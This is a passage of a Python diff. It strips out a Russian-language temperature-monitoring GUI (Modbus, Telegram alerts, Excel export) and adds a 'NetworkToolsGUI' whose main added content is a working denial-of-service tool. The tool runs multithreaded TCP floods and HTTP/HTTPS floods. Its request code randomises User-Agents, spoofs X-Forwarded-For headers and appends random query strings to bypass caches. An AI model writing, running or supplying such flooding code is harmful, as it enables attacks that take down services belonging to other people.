-                                       f"Пороговое значение: {self.threshold_spinboxes[channel].value()} °C")
-                            
-                            if hasattr(self, 'telegram_bot') and self.telegram_bot:
-                                self.telegram_bot.send_message(alert_msg)
-                            
-                            self.threshold_alerts_sent[channel] = True
-                            self.log_message(f"Превышение порога на канале {channel+1}: {temp}°C", logging.WARNING)
-                        
-                        elif (temp <= self.threshold_spinboxes[channel].value() and 
-                              self.threshold_alerts_sent[channel]):
-                            self.threshold_alerts_sent[channel] = False
-                            self.log_message(f"Температура на канале {channel+1} вернулась в норму: {temp}°C", logging.INFO)
-                            
-                    except Exception as conv_error:
-                        self.log_message(f"Ошибка преобразования данных канала {channel+1}: {str(conv_error)}", logging.ERROR)
-                        temps.append(None)
-                        
-                except ModbusIOException as mb_error:
-                    self.log_message(f"Ошибка Modbus IO для канала {channel+1}: {str(mb_error)}", logging.ERROR)
-                    temps.append(None)
-                except Exception as ch_error:
-                    self.log_message(f"Неожиданная ошибка канала {channel+1}: {str(ch_error)}", logging.ERROR)
-                    temps.append(None)
-                    
-            self.update_display(temps, timestamp)
-            self.log_message("=== Данные успешно обновлены ===", logging.DEBUG)
-            
-            if hasattr(self, 'telegram_bot') and self.telegram_bot and len(self.data_log) % 10 == 0:
-                self.telegram_bot.send_current_graphs()
-                self.log_message("Графики отправлены в Telegram")
+                except Exception as e:
+                    timestamp = time.strftime("%H:%M:%S")
+                    self.ping_results.insert("end", f"[{timestamp}] Error: {str(e)}\n", ("down",))
                 
-        except Exception as e:
-            self.log_message(f"КРИТИЧЕСКАЯ ОШИБКА: {str(e)}", logging.CRITICAL)
-            self.stop_monitoring()
-    
-    def update_display(self, temps, timestamp):
-        for i, temp in enumerate(temps):
-            if temp is not None:
-                self.value_labels[i].setText(f"{temp} °C")
-                color = QColor(255, 0, 0) if temp > 50 else QColor(0, 128, 0)
-                self.value_labels[i].setStyleSheet(f"color: {color.name()};")
-            else:
-                self.value_labels[i].setText("Ошибка")
-                self.value_labels[i].setStyleSheet("color: gray;")
-        
-        log_entry = {'timestamp': timestamp}
-        for i, temp in enumerate(temps, 1):
-            log_entry[f'channel_{i}'] = temp
-        self.data_log.append(log_entry)
-        
-        for i in range(8):
-            times = [entry['timestamp'] for entry in self.data_log if entry[f'channel_{i+1}'] is not None]
-            values = [entry[f'channel_{i+1}'] for entry in self.data_log if entry[f'channel_{i+1}'] is not None]
-            
-            if times and values:
-                self.lines[i].set_data(mdates.date2num(times), values)
-                self.axes[i].relim()
-                self.axes[i].autoscale_view()
+                self.ping_results.see("end")
+                time.sleep(0.5)
                 
-        self.canvas.draw()
+            self.ping_results.insert("end", "⏹ Ping stopped by user\n")
+            self.ping_button.configure(state="normal")
+            self.stop_ping_button.configure(state="disabled")
+            
+        threading.Thread(target=ping_thread, daemon=True).start()
         
-        if (self.excel_auto_save and hasattr(self, 'excel_writer') and 
-            self.excel_writer and len(self.data_log) % 10 == 0):
-            self.save_excel_data()
-    
-    def export_to_excel(self):
-        if not self.data_log:
-            self.log_message("Нет данных для экспорта", logging.WARNING)
+    def stop_ping(self):
+        self.ping_stop_flag = True
+        
+    def clear_ping_results(self):
+        self.ping_results.delete("0.0", "end")
+        
+    # TCP Flooding methods
+    def start_tcp_flood(self):
+        target = self.tcp_target_entry.get().strip()
+        port_str = self.tcp_port_entry.get().strip()
+        threads_str = self.tcp_threads_entry.get().strip()
+        packet_size_str = self.tcp_packet_size_entry.get().strip()
+        timeout_str = self.tcp_timeout_entry.get().strip()
+        
+        if not all([target, port_str, threads_str, packet_size_str, timeout_str]):
+            messagebox.showerror("Error", "Please fill in all fields!")
             return
             
-        file_name, _ = QFileDialog.getSaveFileName(
-            self, "Сохранить данные", 
-            self.excel_file, 
-            "Excel Files (*.xlsx)"
-        )
+        try:
+            port = int(port_str)
+            threads = int(threads_str)
+            packet_size = int(packet_size_str)
+            timeout = float(timeout_str)
+            
+            if port < 1 or port > 65535:
+                raise ValueError("Invalid port number")
+            if threads < 1:
+                raise ValueError("Thread count must be positive")
+            if packet_size < 1:
+                raise ValueError("Packet size must be positive")
+            if timeout <= 0:
+                raise ValueError("Timeout must be positive")
+                
+        except ValueError as e:
+            messagebox.showerror("Error", f"Invalid input: {str(e)}")
+            return
+            
+        self.tcp_flood_stop_flag = False
+        self.tcp_flood_packets_sent = 0
+        self.tcp_flood_bytes_sent = 0
+        self.tcp_flood_button.configure(state="disabled")
+        self.stop_tcp_flood_button.configure(state="normal")
+        self.tcp_flood_results.delete("0.0", "end")
+        self.tcp_flood_progress.set(0)
         
-        if file_name:
-            self.excel_file = file_name
-            df = pd.DataFrame(self.data_log)
-            df.set_index('timestamp', inplace=True)
-            df.to_excel(file_name)
-            self.log_message(f"Данные экспортированы в {file_name}")
-    
-    def clear_data(self):
-        self.data_log = []
-        for line in self.lines:
-            line.set_data([], [])
-        for label in self.value_labels:
-            label.setText("-- °C")
-            label.setStyleSheet("color: black;")
-        self.canvas.draw()
-        self.log_message("Данные очищены")
+        # Convert KB to bytes
+        packet_size_bytes = packet_size * 1024
+        
+        def tcp_flood_thread():
+            try:
+                target_ip = socket.gethostbyname(target)
+                self.tcp_flood_results.insert("0.0", f"🌊 Starting TCP flood attack on {target} ({target_ip}) port {port}\n")
+                self.tcp_flood_results.insert("end", f"Using {threads} threads with {packet_size}KB packets\n")
+                self.tcp_flood_results.insert("end", "-" * 50 + "\n")
+                
+                # Configure the tags for colored text
+                self.tcp_flood_results.tag_config("success", foreground=self.success_color)
+                self.tcp_flood_results.tag_config("error", foreground=self.error_color)
+                self.tcp_flood_results.tag_config("info", foreground=self.header_color)
+                
+                start_time = time.time()
+                
+                # Pre-generate some random data patterns for efficiency
+                data_patterns = []
+                for _ in range(10):
+                    data_patterns.append(os.urandom(packet_size_bytes))
+                
+                def flood_worker():
+                    local_packets = 0
+                    local_bytes = 0
+                    
+                    while not self.tcp_flood_stop_flag:
+                        try:
+                            # Create a new socket for each connection
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.settimeout(timeout)
+                            
+                            # Try to connect
+                            s.connect((target_ip, port))
+                            
+                            # Send multiple packets in a single connection
+                            for _ in range(5):  # Send 5 packets per connection
+                                if self.tcp_flood_stop_flag:
+                                    break
+                                    
+                                # Select a random data pattern
+                                payload = random.choice(data_patterns)
+                                
+                                try:
+                                    # Send the data
+                                    bytes_sent = s.send(payload)
+                                    local_packets += 1
+                                    local_bytes += bytes_sent
+                                    
+                                    with threading.Lock():
+                                        self.tcp_flood_packets_sent += 1
+                                        self.tcp_flood_bytes_sent += bytes_sent
+                                except:
+                                    # If sending fails, break the loop
+                                    break
+                            
+                            # Close the socket
+                            try:
+                                s.close()
+                            except:
+                                pass
+                                
+                        except Exception:
+                            # Connection failed, but we continue flooding
+                            pass
+                            
+                        # Small delay to prevent CPU overload
+                        time.sleep(0.001)  # Reduced delay for higher throughput
+                    
+                    return local_packets, local_bytes
+                
+                # Start worker threads
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    futures = []
+                    for _ in range(threads):
+                        if self.tcp_flood_stop_flag:
+                            break
+                        future = executor.submit(flood_worker)
+                        futures.append(future)
+                
+                    # Monitor and update progress
+                    update_interval = 1.0  # Update every second
+                    last_update_time = time.time()
+                    last_packets = 0
+                    last_bytes = 0
+                    
+                    while not self.tcp_flood_stop_flag and any(not f.done() for f in futures):
+                        current_time = time.time()
+                        if current_time - last_update_time >= update_interval:
+                            elapsed = current_time - start_time
+                            packets_per_second = (self.tcp_flood_packets_sent - last_packets) / (current_time - last_update_time)
+                            bytes_per_second = (self.tcp_flood_bytes_sent - last_bytes) / (current_time - last_update_time)
+                            
+                            last_packets = self.tcp_flood_packets_sent
+                            last_bytes = self.tcp_flood_bytes_sent
+                            last_update_time = current_time
+                            
+                            # Calculate MB/s
+                            mbps = bytes_per_second / (1024 * 1024)
+                            
+                            # Format total data sent
+                            if self.tcp_flood_bytes_sent < 1024 * 1024:
+                                total_data = f"{self.tcp_flood_bytes_sent / 1024:.2f} KB"
+                            else:
+                                total_data = f"{self.tcp_flood_bytes_sent / (1024 * 1024):.2f} MB"
+                            
+                            status = f"[{time.strftime('%H:%M:%S')}] Sent {self.tcp_flood_packets_sent} packets | {packets_per_second:.2f} packets/sec | {mbps:.2f} MB/s | Total: {total_data}\n"
+                            self.tcp_flood_results.insert("end", status, ("info",))
+                            self.tcp_flood_results.see("end")
+                            
+                            # Update progress bar (pulsing effect)
+                            progress_value = (self.tcp_flood_progress.get() + 0.1) % 1.0
+                            self.tcp_flood_progress.set(progress_value)
+                            
+                        time.sleep(0.1)
+                
+                # Final status update
+                if not self.tcp_flood_stop_flag:
+                    self.tcp_flood_results.insert("end", "-" * 50 + "\n")
+                    self.tcp_flood_results.insert("end", "🎉 TCP flood completed!\n")
+                else:
+                    self.tcp_flood_results.insert("end", "⏹ TCP flood stopped by user\n")
+                
+                total_time = time.time() - start_time
+                
+                # Format total data sent
+                if self.tcp_flood_bytes_sent < 1024 * 1024:
+                    total_data = f"{self.tcp_flood_bytes_sent / 1024:.2f} KB"
+                else:
+                    total_data = f"{self.tcp_flood_bytes_sent / (1024 * 1024):.2f} MB"
+                
+                # Calculate average MB/s
+                avg_mbps = (self.tcp_flood_bytes_sent / total_time) / (1024 * 1024)
+                
+                self.tcp_flood_results.insert("end", f"Total packets sent: {self.tcp_flood_packets_sent} in {total_time:.2f} seconds\n")
+                self.tcp_flood_results.insert("end", f"Total data sent: {total_data}\n")
+                self.tcp_flood_results.insert("end", f"Average rate: {self.tcp_flood_packets_sent/total_time:.2f} packets/sec | {avg_mbps:.2f} MB/s\n")
+                
+            except Exception as e:
+                self.tcp_flood_results.insert("end", f"❌ Error: {str(e)}\n", ("error",))
+            finally:
+                self.tcp_flood_button.configure(state="normal")
+                self.stop_tcp_flood_button.configure(state="disabled")
+                self.tcp_flood_progress.set(0)
+                
+        threading.Thread(target=tcp_flood_thread, daemon=True).start()
+        
+    def stop_tcp_flood(self):
+        self.tcp_flood_stop_flag = True
+        
+    def clear_tcp_flood_results(self):
+        self.tcp_flood_results.delete("0.0", "end")
+        
+    # HTTPS Flooding methods
+    def start_https_flood(self):
+        target_url = self.https_target_entry.get().strip()
+        threads_str = self.https_threads_entry.get().strip()
+        requests_str = self.https_requests_entry.get().strip()
+        data_size_str = self.https_data_size_entry.get().strip()
+        timeout_str = self.https_timeout_entry.get().strip()
+        http_method = self.https_method_var.get()
+        
+        if not all([target_url, threads_str, requests_str, data_size_str, timeout_str]):
+            messagebox.showerror("Error", "Please fill in all fields!")
+            return
+            
+        if not target_url.startswith(("http://", "https://")):
+            messagebox.showerror("Error", "URL must start with http:// or https://")
+            return
+            
+        try:
+            threads = int(threads_str)
+            requests_per_thread = int(requests_str)
+            data_size = int(data_size_str)
+            timeout = float(timeout_str)
+            
+            if threads < 1:
+                raise ValueError("Thread count must be positive")
+            if requests_per_thread < 1:
+                raise ValueError("Requests per thread must be positive")
+            if data_size < 1:
+                raise ValueError("Data size must be positive")
+            if timeout <= 0:
+                raise ValueError("Timeout must be positive")
+                
+        except ValueError as e:
+            messagebox.showerror("Error", f"Invalid input: {str(e)}")
+            return
+            
+        self.https_flood_stop_flag = False
+        self.https_flood_requests_sent = 0
+        self.https_flood_bytes_sent = 0
+        self.https_flood_button.configure(state="disabled")
+        self.stop_https_flood_button.configure(state="normal")
+        self.https_flood_results.delete("0.0", "end")
+        self.https_flood_progress.set(0)
+        
+        # Convert KB to bytes
+        data_size_bytes = data_size * 1024
+        
+        def https_flood_thread():
+            try:
+                self.https_flood_results.insert("0.0", f"🌊 Starting HTTPS flood attack on {target_url}\n")
+                self.https_flood_results.insert("end", f"Using {threads} threads with {http_method} method and {data_size}KB data\n")
+                self.https_flood_results.insert("end", "-" * 50 + "\n")
+                
+                # Configure the tags for colored text
+                self.https_flood_results.tag_config("success", foreground=self.success_color)
+                self.https_flood_results.tag_config("error", foreground=self.error_color)
+                self.https_flood_results.tag_config("info", foreground=self.header_color)
+                
+                start_time = time.time()
+                total_requests = threads * requests_per_thread
+                
+                # User agents for randomization
+                user_agents = [
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
+                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+                    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
+                ]
+                
+                # Pre-generate some random data patterns for efficiency
+                data_patterns = []
+                for _ in range(5):
+                    data_patterns.append(os.urandom(data_size_bytes))
+                
+                def flood_worker(thread_id):
+                    local_requests = 0
+                    local_bytes = 0
+                    session = requests.Session()
+                    
+                    # Configure session for maximum efficiency
+                    adapter = requests.adapters.HTTPAdapter(
+                        pool_connections=50,
+                        pool_maxsize=50,
+                        max_retries=0
+                    )
+                    session.mount('http://', adapter)
+                    session.mount('https://', adapter)
+                    
+                    for i in range(requests_per_thread):
+                        if self.https_flood_stop_flag:
+                            break
+                            
+                        try:
+                            # Randomize headers
+                            headers = {
+                                "User-Agent": random.choice(user_agents),
+                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                                "Accept-Language": "en-US,en;q=0.5",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Connection": "keep-alive",
+                                "Cache-Control": "no-cache, no-store, must-revalidate",
+                                "Pragma": "no-cache",
+                                "X-Requested-With": "XMLHttpRequest",
+                                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+                            }
+                            
+                            # Add random query parameter to bypass cache
+                            url = f"{target_url}?{random.randint(1, 1000000)}&t={time.time()}"
+                            
+                            # Select random data
+                            data = random.choice(data_patterns)
+                            
+                            # Send the request based on method
+                            if http_method == "GET":
+                                response = session.get(url, headers=headers, timeout=timeout, allow_redirects=False)
+                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
+                            elif http_method == "POST":
+                                response = session.post(url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
+                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items()) + len(data)
+                            elif http_method == "PUT":
+                                response = session.put(url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
+                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items()) + len(data)
+                            elif http_method == "DELETE":
+                                response = session.delete(url, headers=headers, timeout=timeout, allow_redirects=False)
+                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
+                            else:  # HEAD
+                                response = session.head(url, headers=headers, timeout=timeout, allow_redirects=False)
+                                bytes_sent = len(url) + sum(len(k) + len(v) for k, v in headers.items())
+                            
+                            local_requests += 1
+                            local_bytes += bytes_sent
+                            
+                            with threading.Lock():
+                                self.https_flood_requests_sent += 1
+                                self.https_flood_bytes_sent += bytes_sent
+                                
+                        except Exception:
+                            # Request failed, but we continue flooding
+                            pass
+                            
+                        # Small delay to prevent CPU overload
+                        time.sleep(0.001)  # Reduced delay for higher throughput
+                    
+                    return local_requests, local_bytes
+                
+                # Start worker threads
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    futures = []
+                    for i in range(threads):
+                        if self.https_flood_stop_flag:
+                            break
+                        future = executor.submit(flood_worker, i)
+                        futures.append(future)
+                
+                    # Monitor and update progress
+                    update_interval = 1.0  # Update every second
+                    last_update_time = time.time()
+                    last_requests = 0
+                    last_bytes = 0
+                    
+                    while not self.https_flood_stop_flag and any(not f.done() for f in futures):
+                        current_time = time.time()
+                        if current_time - last_update_time >= update_interval:
+                            elapsed = current_time - start_time
+                            requests_per_second = (self.https_flood_requests_sent - last_requests) / (current_time - last_update_time)
+                            bytes_per_second = (self.https_flood_bytes_sent - last_bytes) / (current_time - last_update_time)
+                            
+                            last_requests = self.https_flood_requests_sent
+                            last_bytes = self.https_flood_bytes_sent
+                            last_update_time = current_time
+                            
+                            # Calculate MB/s
+                            mbps = bytes_per_second / (1024 * 1024)
+                            
+                            # Format total data sent
+                            if self.https_flood_bytes_sent < 1024 * 1024:
+                                total_data = f"{self.https_flood_bytes_sent / 1024:.2f} KB"
+                            else:
+                                total_data = f"{self.https_flood_bytes_sent / (1024 * 1024):.2f} MB"
+                            
+                            progress = min(self.https_flood_requests_sent / total_requests, 1.0)
+                            self.https_flood_progress.set(progress)
+                            
+                            status = f"[{time.strftime('%H:%M:%S')}] Sent {self.https_flood_requests_sent}/{total_requests} requests | {requests_per_second:.2f} req/sec | {mbps:.2f} MB/s | Total: {total_data}\n"
+                            self.https_flood_results.insert("end", status, ("info",))
+                            self.https_flood_results.see("end")
+                            
+                        time.sleep(0.1)
+                
+                # Final status update
+                if not self.https_flood_stop_flag:
+                    self.https_flood_results.insert("end", "-" * 50 + "\n")
+                    self.https_flood_results.insert("end", "🎉 HTTPS flood completed!\n")
+                else:
+                    self.https_flood_results.insert("end", "⏹ HTTPS flood stopped by user\n")
+                
+                total_time = time.time() - start_time
+                
+                # Format total data sent
+                if self.https_flood_bytes_sent < 1024 * 1024:
+                    total_data = f"{self.https_flood_bytes_sent / 1024:.2f} KB"
+                else:
+                    total_data = f"{self.https_flood_bytes_sent / (1024 * 1024):.2f} MB"
+                
+                # Calculate average MB/s
+                avg_mbps = (self.https_flood_bytes_sent / total_time) / (1024 * 1024)
+                
+                self.https_flood_results.insert("end", f"Total requests sent: {self.https_flood_requests_sent} in {total_time:.2f} seconds\n")
+                self.https_flood_results.insert("end", f"Total data sent: {total_data}\n")
+                self.https_flood_results.insert("end", f"Average rate: {self.https_flood_requests_sent/total_time:.2f} req/sec | {avg_mbps:.2f} MB/s\n")
+                
+            except Exception as e:
+                self.https_flood_results.insert("end", f"❌ Error: {str(e)}\n", ("error",))
+            finally:
+                self.https_flood_button.configure(state="normal")
+                self.stop_https_flood_button.configure(state="disabled")
+                
+        threading.Thread(target=https_flood_thread, daemon=True).start()
+        
+    def stop_https_flood(self):
+        self.https_flood_stop_flag = True
+        
+    def clear_https_flood_results(self):
+        self.https_flood_results.delete("0.0", "end")
 
-    def closeEvent(self, event):
-        self.save_config()
-        if hasattr(self, 'telegram_bot') and self.telegram_bot:
-            self.telegram_bot.send_message("🛑 Программа закрыта")
-            self.log_message("Telegram бот остановлен")
-        if hasattr(self, 'client') and self.client and self.client.connected:
-            self.client.close()
-            self.log_message("Modbus соединение закрыто")
-        if hasattr(self, 'excel_writer') and self.excel_writer and self.excel_auto_save:
-            self.save_excel_data()
-            self.excel_writer = None
-            self.log_message("Excel автосохранение завершено")
-        self.log_message("Программа закрыта")
-        event.accept()
+def main():
+    root = ctk.CTk()
+    app = NetworkToolsGUI(root)
+    
+    # Center window on screen
+    root.update_idletasks()
+    x = (root.winfo_screenwidth() // 2) - (root.winfo_width() // 2)
+    y = (root.winfo_screenheight() // 2) - (root.winfo_height() // 2)
+    root.geometry(f"+{x}+{y}")
+    
+    root.mainloop()
 
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    app.setStyle('Fusion')
-    monitor = ModernTemperatureMonitor()
-    monitor.show()
-    sys.exit(app.exec_())
+    main()
